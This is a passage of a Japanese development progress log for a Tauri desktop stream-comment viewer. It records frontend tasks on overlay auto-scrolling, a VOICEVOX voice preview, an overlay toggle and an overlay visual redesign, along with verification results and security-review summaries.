がコンパイル）、`check:bindings`＝**drift ゼロ**。
**残課題（実機・本人環境 macOS 14.6.1）**: `tauri dev` で 「OBS オーバーレイ」→**接続前でも**空一覧が OBS に即表示／接続後は
コメントが**ラグなくリアルタイム**反映（コメビュ本体と同等）／オーバーレイに**合計が出ない**（本体は従来どおり表示）、を目視。

### 変更ファイル（033f 追修正②）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（overlay Builder に `background_throttling(Disabled)` 追加＋doc）
- frontend（変更）: `apps/desktop/src/screens/comment-viewer/CommentList.tsx`（`showCount?: boolean` 追加）、
  `apps/desktop/src/screens/comment-viewer/OverlayApp.tsx`（`showCount={false}` を渡す）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: sidecar（Node・無罪確定）・`capabilities/*`・`tauri.conf.json`・`Cargo.toml`・`csp: null`・
  comment-viewer / main 窓の Builder・依存（新規ゼロ）・ts-rs 型（新規ゼロ）

## 2026-07-20 (034a コメビュ本体 最新コメント自動追従＋「最新コメント N件 ↓」ジャンプボタン)

親 [034](tasks/034-comment-viewer-obs-ux-round2.md) 第2弾の先頭。要望5（コメビュ側）を潰す。純粋な frontend の
スクロール/DOM 制御と CSS/トークン追加のみで、通信・sidecar・WS・Rust command・依存には一切触れない。

### 実装内容

- **追従判定を再利用フックに切り出し**（新規 `apps/desktop/src/features/comment-viewer/useFollowScroll.ts`）:
  `useFollowScroll(scrollRef, items, { mode })` を追加。`mode: "release" | "always" | "off"`。
  - `following` は**ユーザーのスクロール（onScroll）でのみ**切り替える（append では変えない）ので、閾値と行高が結合して
    append 直後に一瞬「解除」判定になりチラつくのを避ける。閾値は **`FOLLOW_THRESHOLD_PX = 64`**（`scrollHeight - scrollTop - clientHeight <= 64` を「下端＝追従中」とみなす）。
  - 新着反映は **`useLayoutEffect([items])`**（描画前に走らせチラつき回避）。`always` または追従中は最下部へ
    （`el.scrollTop = el.scrollHeight`）＋watermark 更新＋`unseenCount=0`。解除中（release かつ非追従）は watermark
    （最後に数え込んだ最新 id）以降の新規件数を id で数えて `unseenCount` に積み増す。200 件クランプで watermark が
    落ちた稀ケース（解除中に >200 件到来）は全件を未読扱いにフォールバック（実害小・コメント明記）。
  - `jumpToLatest` … 最下部へスクロール＋追従再開＋`unseenCount=0`。
- **034b 再利用 API**: この追従判定は `CommentList` の **`followMode` prop** で出し分ける。034b はオーバーレイに
  **`followMode="always"`** を渡すだけで「常時追従・解除/ボタン無し」を再利用できる（親 034 の依存）。034a の
  オーバーレイは `followMode` 無指定（=`"off"`）のまま＝素の `<ol>`（ref/onScroll は off で no-op）で DOM/CSS 非退行。
- **ジャンプボタンの配置**（`CommentList.tsx`）: `followMode==="release"` のときだけ `<ol>` を `position:relative` の
  `.listWrap` で包み、`!following && unseenCount>0` で半透過黒の長丸ボタン「最新コメント {N}件 ↓」を下部中央へ重ねる。
  `off`/`always` は素の `<ol>`（map JSX を変数化してラッパ有無で共有し重複回避）。`CommentList` は表示専用
  （接続/WS/TTS の業務 state 非保有）のまま。
- **配色トークン**（`theme.css`）: `.module.css` に生 rgba を残さないため専用トークンを新設。
  `--comment-jump-bg: color-mix(in srgb, #05070d 62%, transparent)`（≈ rgba(0,0,0,.6) 相当）／`--comment-jump-bg-hover`（72%）／
  `--comment-jump-fg: #fff`。既存スクリム系 `--tutorial-*` と同じ `#05070d` 基色で両テーマとも暗いまま＝白文字が乗る。
  `CommentViewerApp.module.css` の `.listWrap` / `.jumpButton` は `var(--comment-jump-*)` 経由のみ。
- **配線**（`CommentViewerApp.tsx`）: 本体末尾を `<CommentList comments={comments} followMode="release" />` に（1 行）。

### 検証

- `pnpm --filter ./apps/desktop typecheck`＝**0 error**、`pnpm --filter ./apps/desktop lint`＝**0 error / 0 warning**。
- 自己確認: ①`*.module.css` に生 hex/rgba なし（`CommentViewerApp.module.css` grep で 0 件・すべて `var(--...)`）
  ②`mergeComments`／上限 200／sidecar／WS／Rust 無改変 ③新規 command/capability/依存なし・`csp: null` 不変
  ④`CommentList` 表示専用のまま・034b は `followMode="always"` で追従ロジックを再利用可。
- **残課題（実機・本人環境）**: `tauri dev` で 下端追従／閾値超えスクロールアップで解除＋自動スクロール停止／解除中は
  「最新コメント N件 ↓」ボタンが下部中央に出て N が更新／クリックで最下部＋追従再開＋カウント 0／既存の取得・読み上げ・
  レイアウト・オーバーレイ表示に退行なし、を目視。

### 変更ファイル（034a）

- frontend（新規）: `apps/desktop/src/features/comment-viewer/useFollowScroll.ts`
- frontend（変更）: `apps/desktop/src/screens/comment-viewer/CommentList.tsx`（`followMode` prop＋ref/onScroll＋release 時のラッパ/ボタン）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（`followMode="release"` を渡す）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.module.css`（`.listWrap` / `.jumpButton`）、
  `apps/desktop/src/styles/theme.css`（`--comment-jump-bg` / `-bg-hover` / `-fg`）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: sidecar（Node）・`mergeComments`（上限 200）・`OverlayApp.tsx`／`OverlayApp.module.css`・`capabilities/*`・
  `tauri.conf.json`・`Cargo.toml`・`csp: null`・依存（新規ゼロ）・ts-rs 型（新規ゼロ）

## 2026-07-20 (034b OBSオーバーレイ 常時追従＋サイドバー(スクロールバー)抑止)

親 [034](tasks/034-comment-viewer-obs-ux-round2.md) 第2弾。要望5（オーバーレイ側）・要望7 を潰す。034a が
`CommentList` に用意した追従の仕組みを **常時追従モードで再利用** し、透過オーバーレイ窓（`comment-overlay`）に出る
既定の縦スクロールバーを **`data-overlay` スコープ限定で抑止** する。frontend のスクロール制御（prop 1 つ）と CSS
追加のみで、通信・sidecar・WS・Rust command・capability・依存には一切触れない。

### 実装内容

- **常時追従の載せ方**（`OverlayApp.tsx`）: `<CommentList>` に **`followMode="always"` を追加するだけ**（新規ロジック
  ゼロ）。034a の `useFollowScroll(mode:"always")` をそのまま再利用し、`useLayoutEffect([items])` が items 変化のたび
  最下部へ（`el.scrollTop = el.scrollHeight`）追従＝配信画面に最新コメントが映り続ける。`onScroll` は `mode!=="release"`
  で no-op、`listWrap` ラッパ/「最新コメント N件 ↓」ボタンは付かない（`release` 限定）＝オーバーレイの DOM は素の
  `<ol>` のままで 033f の透過体裁を非退行維持。読み取り専用接続（`onComments` のみ・制御フレーム送信ゼロ）も無改変。
- **スクロールバー抑止セレクタ**（`OverlayApp.module.css`）: 実スクロール要素の `<ol>` は `CommentViewerApp.module.css`
  の `.list`（**別モジュールのハッシュクラス**）なので `OverlayApp.module.css` からクラス名では当てられない。既存の透過
  CSS と同じ作法で **要素/属性スコープに `:global` で当てる**:

  ```css
  :global(html[data-overlay="1"] ol)::-webkit-scrollbar {
    width: 0;
    height: 0;
  }
  ```

  `ol` は type selector で CSS Modules がスコープしない。オーバーレイ窓の `<ol>` はコメント一覧のみ
  （`showCount={false}` で listHeader も無い）なので過不足なく命中。完了条件「バーが出ない」に合わせ **完全非表示**
  （`--overlay-scrollbar` の極細/半透明は"見せる"手本なので不採用・token 参照なし）。
- **本体・他窓非影響の担保**: 追加 CSS は全て `html[data-overlay="1"]` 配下限定。`data-overlay` は `OverlayApp.tsx`
  が overlay 窓の documentElement にだけ立て unmount で外す（無改変）。main / comment-viewer 窓は属性を持たないため、
  034a の本体追従・ジャンプボタン・本体スクロールバーには一切影響しない。

### 検証

- `pnpm --filter ./apps/desktop typecheck`＝**0 error**、`pnpm --filter ./apps/desktop lint`＝**0 error / 0 warning**。
- コード差分は 2 ファイル・+16/-1（`OverlayApp.tsx` / `OverlayApp.module.css` のみ。`git diff --stat` は本記録
  `docs/progress.md` を含め 3 ファイルになる）。
- 自己確認: ①オーバーレイの読み取り専用性維持（`onComments` のみ・制御フレーム送信ゼロ・新規通信面/宛先ゼロ＝差分は
  `followMode` prop 追加のみで接続コード無変更）②スクロールバー抑止が `data-overlay` スコープ限定で本体側に非影響
  ③新規 command/capability/依存なし・`csp: null` 不変 ④`open_comment_overlay_window`/no-orphan kill 契機 不変
  （Rust 無改変）。
- **残課題（実機・本人環境）**: `tauri dev` で オーバーレイを開き 常に最下部へ追従して最新が映り続ける／透過オーバー
  レイに縦スクロールバー（サイドバー）が出ない／本体（コメビュ）のスクロールバーと 034a の追従/ジャンプボタンに影響
  なし／OBS のウィンドウキャプチャで従来どおり透過合成できる（033f 挙動維持）、を目視。

### 変更ファイル（034b）

- frontend（変更）: `apps/desktop/src/screens/comment-viewer/OverlayApp.tsx`（`<CommentList>` に `followMode="always"`）、
  `apps/desktop/src/screens/comment-viewer/OverlayApp.module.css`（`data-overlay` スコープの `::-webkit-scrollbar` 抑止）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `useFollowScroll.ts`／`CommentList.tsx`（034a を再利用のみ）・`CommentViewerApp.module.css`・
  sidecar・WS・`mergeComments`（上限 200）・`open_comment_overlay_window`／no-orphan kill 契機・`capabilities/*`・
  `tauri.conf.json`・`Cargo.toml`・`csp: null`・依存（新規ゼロ）

## 2026-07-20 (034c VOICEVOX 話者サンプルボイス試聴（選択で即再生・再生中は中断切替）)

親 [034](tasks/034-comment-viewer-obs-ux-round2.md) 第2弾・要望2。設定ビューで話者/スタイルを選ぶと **その声のサンプルが
即再生** され、**再生中に別の声を選ぶと前を中断して切り替わる**。実コメント読み上げ本線（`ttsQueue.ts`）には
**一切干渉しない独立経路**（別 AudioContext・キューに積まない）として足す。宛先はループバック 50021 の例外（032c-c）内・
既存の許可メソッド（POST `/audio_query`・`/synthesis`）の再利用のみで、新規メソッド/宛先・依存・command・capability を
一切増やさない。

### 実装内容

- **試聴プレイヤー新設**（`apps/desktop/src/features/comment-viewer/voicevoxPreview.ts`・新規）: `createVoicevoxPreview()`
  が「現在の合成 `AbortController`」と「再生中の `AudioBufferSourceNode`」をクロージャに保持し、`play(styleId)` の先頭で
  `stopCurrent()`（前の合成を `abort()` ＋ 保持 source の `onended` を外して `stop()`）してから新しい声を鳴らす。これで
  **合成中の切替（abort）** も **再生中の切替（source.stop）** も両方その場で切り替わる。各 `await` 後に
  `disposed || controller.signal.aborted` をガードして、切替/破棄で捨てられた再生が鳴らないようにする。catch は
  中断切替（`aborted`）を正常系として黙って return、ENGINE 未起動・合成失敗は `console.debug` で握って落とさない
  （既存 loopback fetch の作法）。
- **`playWav` は改修せず、試聴用の再生を preview 内に自前で持つ**: 中断には source 参照の保持が必須だが、既存
  `playWav`（`voicevox.ts`）は source を外に出さず `onended` まで解決する形で、**唯一の呼び出し元 ttsQueue の直列
  `await` 契約**を持つ。戻り値型を変えると本線を壊すリスクがあるため `playWav` は**一切触らず**、試聴側は
  decode→createBufferSource→start の 3 行を `voicevoxPreview.ts` 内に持ち、source を保持する。合成 HTTP は
  `synthesize()` を**そのまま再利用**（宛先・メソッド共有）。→ **ttsQueue 非影響を `voicevox.ts`/`ttsQueue.ts`
  無改変で担保**。
- **AudioContext は本線と別・遅延生成**: 初回 `play`（＝設定ビューの `onChange`＝ユーザー操作内で同期的に `new`）まで
  作らない。ユーザー操作契機のため WKWebView autoplay を通り、`state !== "running"` なら `resume()` を試みてから合成する。
- **SettingsView への配線**（`SettingsView.tsx`）: state は従来どおり `CommentViewerApp` に残し、新 prop
  `onPreview(styleId)` を渡す（実体は `(id) => previewRef.current?.play(id)`）。SettingsView は preview モジュールを直接
  import しない（表示専用の作法を維持）。話者 select（切替時は先頭スタイルの id）・スタイル select の 2 箇所の `onChange`
  から `onSpeakerIdChange` に続けて `onPreview` を呼ぶ。加えて「試聴 ▶」小ボタン（既存 `.btnGhost` 流用）で選択を変えずに
  聴き直せる（同じ `onPreview` を呼ぶだけ・別導線を増やさない）。
- **preview の生成/破棄**（`CommentViewerApp.tsx`）: `previewRef` を `ttsRef` と同型の `useEffect([])` でマウント時
  `createVoicevoxPreview()`・アンマウント時 `dispose()`。
- **固定サンプル文**: `PREVIEW_TEXT = "こんにちは。VOICEVOXの音声サンプルです。"` を `voicevoxPreview.ts` に定数化。
  **送るのはこの定型のみ**（コメント本文・著者名・認証情報は送らない）。
- **ENGINE 未起動時**: 既存挙動で `speakers.length === 0` のとき select 自体が非描画（案内文を表示）＝`onChange` が
  発火せず試聴も走らない。既存の起動案内にそのまま委ねる（試聴用の追加ガードは不要）。一覧取得後に ENGINE が落ちた
  稀ケースで select 変更した場合は `synthesize` の fetch が失敗 → preview の catch が握る（クラッシュしない）。

### 検証

- `pnpm --filter ./apps/desktop typecheck`＝**0 error**、`pnpm --filter ./apps/desktop lint`＝**0 error / 0 warning**。
- `git diff --stat`＝`CommentViewerApp.tsx`（+20）/`SettingsView.tsx`（+22/-2）の 2 ファイル（新規 `voicevoxPreview.ts`
  は untracked・本記録 `docs/progress.md` を含めると計 4 ファイル）。
- 自己確認: ①宛先は `synthesize()` 経由で `127.0.0.1:50021` ループバック不変・POST は `/audio_query`・`/synthesis` のみ
  （変更 frontend の追加行に新規 `fetch`/URL/エンドポイント/`invoke` が無いことを grep で確認・許可メソッド列挙は不変）
  ②TTS 本線非干渉（別 AudioContext・キューに積まない・`voicevox.ts`/`ttsQueue.ts` 無改変）③Rust 依存/command/capability
  を足さない・viewer webview の fetch＋Web Audio のみ・`csp: null` 不変・`docs/security.md` 無改変。よって security-review
  は原則不要の範囲（既存許可メソッドの再利用・ループバック不変）。
- **残課題（実機・本人環境／要ローカル VOICEVOX ENGINE）**: `tauri dev` で 設定→話者/スタイル選択で即サンプル再生／
  再生中に別話者選択で中断切替／「試聴 ▶」で聴き直し／実コメント読み上げ本線に影響なし／ENGINE 未起動時は試聴せず
  起動案内、を目視。DevTools Network で 50021 への POST が `/audio_query`・`/synthesis` のみ（新規メソッドが無い）ことを確認。

### 変更ファイル（034c）

- frontend（新規）: `apps/desktop/src/features/comment-viewer/voicevoxPreview.ts`（中断切替つき試聴プレイヤー・別
  AudioContext・`synthesize` 再利用・自前 decode/source/start）
- frontend（変更）: `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（`previewRef` 生成/破棄・
  `onPreview` prop を SettingsView へ）、`apps/desktop/src/screens/comment-viewer/SettingsView.tsx`（`onPreview` prop・
  2 つの `onChange` から試聴・「試聴 ▶」ボタン）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `voicevox.ts`（`playWav`/`synthesize` 無改変）・`ttsQueue.ts`（本線無改変）・`docs/security.md`
  （許可メソッド列挙不変）・sidecar・WS・`capabilities/*`・`tauri.conf.json`・`Cargo.toml`・`csp: null`・依存（新規ゼロ）

## 2026-07-20 (034d OBSオーバーレイ表示 ON/OFF を設定ビューへ移設＋開閉状態インジケータ)

### 背景 / 目的

OBS オーバーレイ窓の開閉は本体ツールバーの 2 ボタン（`OBS オーバーレイ`/`閉じる`）で行っていたが、両方 `btnGhost` 一色で
**開閉状態を保持する state が無く**「今開いているのか閉じているのか分からない」（親 034 要望1）。また操作が本体に露出し設定へ
集約されていない（要望4）。本タスクで (1) 開閉状態を返す**読み取り専用 Rust command を 1 つ追加**し、(2) 開閉操作を
**設定ビューの新設「OBS オーバーレイ」節**の**1 トグル**（現在の開閉を配色＋ARIA で明示）へ移設した。この節は 034e が
サイト名トグル等のデザイン設定を隣に足す土台になる。

### やったこと

- **(1) 読み取り専用 command 追加**（`lib.rs`）: `is_comment_overlay_open`（`app.get_webview_window("comment-overlay").is_some()`
  を返すだけ・手本は `is_comment_viewer_open`）を追加し `generate_handler!` に登録。`windowApi.ts` に `isCommentOverlayOpen()`
  ラッパ（`invoke<boolean>("is_comment_overlay_open")`）追加。**新規 ts-rs 型なし**（bool 返却＝生成 bindings 無影響＝drift なし）。
- **(2) 設定ビューへ移設＋状態トグル**: 本体ツールバーの開閉 2 ボタンと直下の `.overlayHint` <p> を撤去し、`SettingsView` に
  「OBS オーバーレイ」節を新設。既存 `ToggleSwitch`（`role="switch"`＋`aria-checked`＋`switchOn` の active 配色）を流用した
  **1 トグル**（ON=開く/OFF=閉じる）に統合。OBS 取り込み案内文はこの節の `note` へ移設。`CommentViewerApp` に `overlayOpen`
  state を持たせ、①マウント時 `isCommentOverlayOpen()` で同期 ②トグル操作後に更新 ③開いた直後に `comment-overlay` 窓へ
  `onCloseRequested` を張り、外部（窓の×）で閉じられたら state を戻す。`handleOpenOverlay`/`handleCloseOverlay` は 1 つの
  `handleOverlayToggle` に統合、`overlayOpen`/`onOverlayToggle` を props で SettingsView へ渡す。CSS に `.overlayPanel`
  （`.voicevoxPanel` に倣う）追加、不要になった `.overlayHint` 定義を削除。

### 外部 close 検知 = 窓イベント購読（ユーザー承認済み・設計判断）

- 候補①窓イベント購読 ②Rust から emit ③ポーリング のうち**①窓イベント購読**を採用。`WebviewWindow.getByLabel("comment-overlay")`
  ＋ `onCloseRequested`（`preventDefault()` は呼ばず観測のみ）。**frontend 完結で Rust 無変更**＝ no-orphan kill 契機不変、
  `listen` は既存 `core:default` 内の `core:event` で賄い**新規 capability 不要**。開くたびに張り直し、`overlayUnlistenRef` で
  解除管理＋unmount クリーンアップし購読リークを防ぐ。トグル部品は 034e との一貫性から既存 `ToggleSwitch` 流用（仕様の
  `aria-pressed` に対し switch では `aria-checked` が正しい等価表現）。

### no-orphan kill 契機不変の確認

- オーバーレイ窓へ `on_window_event` を追加せず、`close_comment_overlay_window` も無変更。sidecar kill は従来どおり
  `comment-viewer` 窓の `CloseRequested|Destroyed`（lib.rs 64-71）と `RunEvent::Exit`（同 327-330）の 2 契機のみで、
  オーバーレイ開閉は sidecar に一切触れない（033f 集約を維持）。

### security-review 結果

- **問題なし**（修正必須なし・コード変更なし）。①`is_comment_overlay_open` は読み取り専用（bool のみ・引数は `AppHandle`
  のみ・OS/プロセス/ファイル/通信を伴わない）②`main`/`comment-viewer`/`comment-overlay` の capability 不変・`csp: null` 不変・
  新規依存ゼロ（`capabilities/*`・`tauri.conf.json`・`Cargo.toml`・`package.json` は git diff 空）③no-orphan kill 契機不変
  ④オーバーレイ表示専用性を維持（開閉ラッパ無変更・通信面を広げない）。軽微メモ: OFF トグルの自前 close でも購読 CB が
  1 回発火するが `setOverlayOpen(false)` は冪等で無害。

### 検証

- `pnpm --filter ./apps/desktop typecheck`＝**0 error**、`pnpm --filter ./apps/desktop lint`＝**0 error / 0 warning**、
  `cd apps/desktop/src-tauri && cargo check`＝**通過**。
- `git diff --stat`＝5 ファイル（`lib.rs` +8 / `windowApi.ts` +9 / `CommentViewerApp.module.css` 削除含む / `CommentViewerApp.tsx`
  ±／`SettingsView.tsx` +20。本記録 `docs/progress.md` を含めると 6 ファイル）。
- **残課題（実機・本人環境）**: `pnpm --filter ./apps/desktop tauri dev` で 本体ツールバーから開閉ボタンが消え設定に 1 トグル／
  トグルで開閉でき配色＋`aria-checked` で状態が分かる／窓の×で外部から閉じても close 購読で state が戻る／オーバーレイ close で
  sidecar（Twitch/YouTube コメント取得プロセス）が落ちない、を目視。

### 変更ファイル（034d）

- Rust（変更）: `apps/desktop/src-tauri/src/lib.rs`（`is_comment_overlay_open` 追加＋登録）
- frontend（変更）: `apps/desktop/src/features/comment-viewer/windowApi.ts`（`isCommentOverlayOpen()` ラッパ）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（`overlayOpen` state・初期同期/購読解除 effect・
  `handleOverlayToggle`・ツールバー 2 ボタン＋ヒント撤去・props 追加）、
  `apps/desktop/src/screens/comment-viewer/SettingsView.tsx`（props 2 つ＋「OBS オーバーレイ」節）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.module.css`（`.overlayPanel` 追加・`.overlayHint` 削除）
- docs: `docs/progress.md`（本記録）
- 不変（確認済み）: `capabilities/*`（`comment-overlay`/`comment-viewer`/`default` すべて `core:default` のまま）・
  `tauri.conf.json`（`csp: null`）・`Cargo.toml`・`package.json`・sidecar・WS・オーバーレイ開閉ラッパ挙動・依存（新規ゼロ）

## 2026-07-20 (034e OBSオーバーレイ デザイン刷新（アイコン＋吹き出しチャット意匠・文字拡大・フォント選択・サイト名トグル）)

### 背景 / 目的

OBS オーバーレイは本体と同じ不透明カード（`CommentViewerApp.module.css` の `.item`）を小さい文字で並べているだけで、
親 034 の要望「3=ダサい / 6=文字が小さい / 4=意匠を設定」に未対応だった。**本人指示でデザイン方針を差し替え**、各コメントを
**「左にアイコン＋ユーザー名（縦積み）／右に半透過グレーの吹き出しに本文」**というチャット体裁へ刷新した（当初 034e の
「透過・本文＋名前のフラット表示」から変更）。窓の透過（033f/034b）は維持し、意匠はオーバーレイのときだけ当てる。
**実アイコンの取得（Twitch/YouTube CDN・sidecar 経由）は本タスクでは行わず、アイコン枠だけ確保して次タスク 034f へ分離**した。

### 新意匠（`data-overlay` スコープ・`variant` 分岐に限定）

- **意匠の当て方＝`CommentList` の `variant` プロップ**。新意匠は DOM 構造が違う（アイコン要素・名前要素・吹き出し要素が要る）
  ため `data-overlay` の CSS 上書きだけでは作れないと判断。`CommentList` に `variant?: "default" | "overlay"`（既定 `default`）と
  `showSource?: boolean`（既定 false）を足し、`variant==="overlay"` のときだけ**新クラスの別マークアップ**を描く。既定分岐は現行の
  ままで**本体（comment-viewer）の見た目は不変**。新クラスは**新規 CSS モジュール** `OverlayComment.module.css` に隔離し、本体
  `CommentViewerApp.module.css`・窓透過専用 `OverlayApp.module.css` には触れない。
- マークアップ: `li(flex row)` ＝ `div.left(縦積み: div.icon＋span.name)` ＋ `div.bubble(p.text＋任意の span.source)`。overlay 項目は
  不透明 `.item`（`var(--surface)`）を使わないので**背景は透過のまま＝吹き出しだけ半透過グレー**（OBS 合成で背景が抜ける挙動を維持）。
- **アイコン枠（034f を見据える）**: `div.icon` を **44×44 の丸＋白枠のグレー プレースホルダ**（CSS のみ・外部画像/data-URI なし）で
  描画。034f では `background-image` インライン指定 or `<img>` 追加だけで済むよう `background-size:cover`/`position:center` を先置き。

### 配色トークン（theme.css・`:root` 基底のみ＝テーマ非依存）

- オーバーレイは OBS 映像の上に合成されるためアプリのテーマ（ライト/ダーク）に依らず一定にする方針で、per-theme 上書きは置かない。
  追加トークン: `--overlay-name-fg`（太め黒 `#0a0a0a`）/ `--overlay-body-fg`（少し薄い黒 `#2b2b2b`）/ `--overlay-outline`（白）/
  `--overlay-bubble-bg`（`color-mix(in srgb, #6b7280 80%, transparent)`＝半透過グレー）/ `--overlay-bubble-border`（白枠）/
  `--overlay-icon-bg` / `--overlay-icon-border` / `--overlay-source-fg`。生 hex は theme.css のみ（トークン定義元）。縁取りは
  **多重 `text-shadow`（白・上下左右＋ぼかし）**で作る（`-webkit-text-stroke` はグリフが痩せるので不採用）。`OverlayComment.module.css`
  は全色 `var(--overlay-*)` 経由で**生 hex/rgba を残さない**（grep 確認）。文字サイズ（本文 19px 等）は tauri dev で目視調整前提の初期値。

### フォント選択（OS 標準 4 種・外部フォント無し）

- 新規 `overlaySettings.ts` にフォント登録簿（`OVERLAY_FONTS`）を持たせ、`OverlayApp` の `.root` に inline `font-family` で適用
  （子孫の名前/本文が継承・モジュール CSS に font-family を書かない）。候補は **システム標準 / ゴシック(Yu Gothic 系) / 丸ゴシック
  (Hiragino Maru→gothic フォールバック) / 明朝(Yu Mincho 系)** の 4 種で、すべて OS 標準スタック。**外部 Web フォント・新規 @font-face は
  追加しない**（CSP 方針。新 CSS に `url()`/`@font-face`/`@import` 無し＝grep 確認）。

### サイト名（配信サービス）表示トグル

- 設定ビュー（034d のオーバーレイ節）に「サイト名を表示する」`ToggleSwitch` を追加（既定 OFF）。ON でオーバーレイの各コメントに
  `source`（Twitch/YouTube）を吹き出し右下へ小さく添える。**受信済み `CommentViewDto.source` の表示のみ・新規取得なし**。

### 永続化＋クロス窓 即時反映（storage 購読）

- `overlaySettings.ts`（`ttsPrefs`/`channelStorage` の load/save 手本）。キー `stream-dock.comment-viewer.overlay-font`（string・既定
  `system`）/ `overlay-show-source`（bool・既定 OFF）。設定窓（`CommentViewerApp`）は `useState(()=>load…())`＋保存 effect で永続化し、
  props で `SettingsView` へ。オーバーレイ窓（`OverlayApp`）は起動時に `load…()`＋**`window.addEventListener("storage", …)`** で対象キーの
  変更を再読込＝**設定窓での変更が開いたままのオーバーレイへ即反映**（両窓は別 webview・同一 localStorage）。unmount で解除。
  storage イベントは DOM イベントでネットワーク非経由・表示専用性は不変。

### security-review 結果

- **問題なし**（修正必須なし）。①新規外部通信ゼロ（`fetch`/`http`/`ws`/`invoke`/`WebSocket` の追加なし＝grep 確認。storage 購読は
  DOM イベント）②外部アセットなし（新 CSS に `url()`/`@font-face`/`@import` 無し・アイコンは CSS プレースホルダ・フォントは OS 標準
  スタックで URL 参照ゼロ）③`tauri.conf.json`/`capabilities/*`/`Cargo.toml`/`package.json`/lock は git diff 空＝`csp: null` 不変・
  新規 command / capability / 依存ゼロ④サイト名は受信済み `source` の表示のみ・コメント本文はログ/DB に出さない⑤本体 CSS・窓透過 CSS
  無変更で `variant` 分岐＋新モジュールに波及を限定⑥フォント値は固定登録簿 id に照合してからスタック解決＝CSS 注入面なし・localStorage は
  非機密 UI 値のみ。034f（実アイコン CDN 取得）着手時は新規外部通信・宛先追加のため**再 security-review 必須**。

### 検証

- `pnpm --filter ./apps/desktop typecheck`＝**0 error**、`pnpm --filter ./apps/desktop lint`＝**0 error / 0 warning**。
  Rust 差分ゼロのため `cargo check` は対象外（無影響）。
- `git diff --stat`＝変更 6 ファイル（`theme.css` / `CommentList.tsx` / `OverlayApp.tsx` / `SettingsView.tsx` / `CommentViewerApp.tsx` /
  `034e-overlay-design-refresh.md`）＋新規 2 ファイル（`overlaySettings.ts` / `OverlayComment.module.css`）。本記録 `docs/progress.md` を含む。
- **残課題（実機・本人環境）**: `pnpm --filter ./apps/desktop tauri dev` で ①アイコン（デフォルト）＋名前（黒＋白縁取り）＋半透過グレー
  吹き出し（白枠）＋本文（薄め黒＋白縁取り・大きめ）で表示 ②フォント選択が効く ③サイト名トグル ON/OFF が即反映 ④本体（コメビュ）の
  見た目は不変 ⑤OBS ウィンドウキャプチャで従来どおり透過合成、を目視。文字サイズ/グレー濃度の微調整も実機で行う。

### 変更ファイル（034e）

- frontend（新規）: `apps/desktop/src/features/comment-viewer/overlaySettings.ts`（フォント登録簿＋2 設定の load/save/resolve＋キー定数）、
  `apps/desktop/src/screens/comment-viewer/OverlayComment.module.css`（オーバーレイ チャット意匠・`--overlay-*` トークン参照）
- frontend（変更）: `apps/desktop/src/screens/comment-viewer/CommentList.tsx`（`variant`/`showSource` プロップ＋overlay 分岐マークアップ）、
  `apps/desktop/src/screens/comment-viewer/OverlayApp.tsx`（設定読込＋storage 購読＋`.root` inline font-family＋`variant="overlay"`/`showSource`）、
  `apps/desktop/src/screens/comment-viewer/SettingsView.tsx`（フォント `<select>`＋「サイト名を表示する」トグル＋props 4 つ）、
  `apps/desktop/src/screens/comment-viewer/CommentViewerApp.tsx`（`overlayFont`/`overlayShowSource` state＋保存 effect＋props 受け渡し）、
  `apps/desktop/src/styles/theme.css`（`--overlay-*` トークン新設・`:root` 基底のみ）
- docs: `docs/tasks/034e-overlay-design-refresh.md`（デザイン方針を刷新・034f 分離を明記）、`docs/progress.md`（本記録）
- 不変（確認済み・git diff 空）: `capabilities/*`・`tauri.conf.json`（`csp: null`）・`Cargo.toml`・`package.json`・pnpm-lock・sidecar・WS・
  本体 `CommentViewerApp.module.css`・窓透過 `OverlayApp.module.css`・bindings/`CommentViewDto`/`CommentAuthor`・Rust・依存（新規ゼロ）

### 追修正（デザイン微調整・本人フィードバック反映）

初版（上記）の実機イメージとのズレ 4 点を frontend の描画/CSS のみで調整した（新規外部通信・依存・capability・外部アセット
ゼロ／`csp: null` 不変／配色は `--overlay-*` トークン経由・`OverlayComment.module.css` に生 hex/rgba なし＝grep 確認、を維持）。

- **吹き出しをほぼ純白へ**: `--overlay-bubble-bg` を半透過グレー（`#6b7280 80%`）→ ほぼ純白（`#ffffff 90%`）。近白だと白枠が明るい
  映像で消えるため `--overlay-bubble-border` をごく薄い暗色に寄せ、新設 `--overlay-bubble-shadow` で `.bubble` に `filter: drop-shadow`
  を掛けて輪郭を出す（しっぽ疑似要素にも及ぶ）。本文 `.text` の白縁取りは近白背景では不要なので撤去。
- **レイアウト刷新（名前折りたたみ解消）**: overlay 項目を「名前行（`.header`）＋アイコン｜吹き出し行（`.row`）」の縦積みに変更。
  旧 `.left`（48px 固定・アイコン＋名前の縦積み）を廃止し、名前は狭いカラムから解放（1 行流し・長名は ellipsis）。`renderOverlayItem`
  のマークアップを `li.item > (div.header > span.name + span.source) + (div.row > div.icon + div.bubble > p.text)` へ再構成。
- **サイト名を名前の横・色付きピルバッジへ**: `span.source` を吹き出し内右下から名前の右隣（`.header`）へ移動。サービス別の色付き
  ピル（Twitch=紫 `--overlay-source-twitch-bg` / YouTube=赤 `--overlay-source-youtube-bg`・白文字）にし、`CommentList` に overlay 用
  `OVERLAY_SOURCE_CLASS`（source→class マップ・default の `SOURCE_CLASS` と同型）を追加。旧 `--overlay-source-shadow`（吹き出し内明色前提の
  暗色ハロー）は不要になり削除。
- **吹き出しのしっぽ追加**: `.bubble::before` を `clip-path: polygon()` の単一三角（左向き・左辺上寄り＝アイコン方向）で新設。半透過どうしの
  二重不透明を避けるため border 三角の二枚重ねは採らず、輪郭は上記 drop-shadow に委ねる。位置/サイズは tauri dev で微調整前提の初期値。
- 変更ファイル（追修正）: `CommentList.tsx`（マップ＋overlay マークアップ）・`OverlayComment.module.css`（新レイアウト/しっぽ）・
  `theme.css`（overlay トークン調整）。本体 default 分岐・`CommentViewerApp.module.css`・`OverlayApp.module.css`・`src-tauri`/依存は不変。
